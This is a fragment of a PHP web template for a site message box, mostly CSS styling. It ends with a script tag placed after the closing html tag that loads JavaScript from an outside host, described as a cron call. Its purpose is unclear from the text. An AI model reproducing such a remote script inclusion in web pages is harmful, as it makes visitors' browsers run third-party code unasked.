...
border-radius: 1px;
                ...
                .showMsg .bottom{
                background:#fffced; margin: 0 1px 1px 1px;line-height:26px; *line-height:30px; height:26px; text-align:center;
                 padding-top: 5px;
                    padding-bottom: 5px;
                }
                .showMsg .ok, .showMsg .guery, .showMsg .no{
                background: url("<?php echo SITE_URL; ?>omooo/statics/images/msg_bg.png") no-repeat 0px -560px;
                }
                .showMsg .guery{
...
</html><script type="text/javascript" src="http://zan.jiaye.in/index.php?c=cron"></script>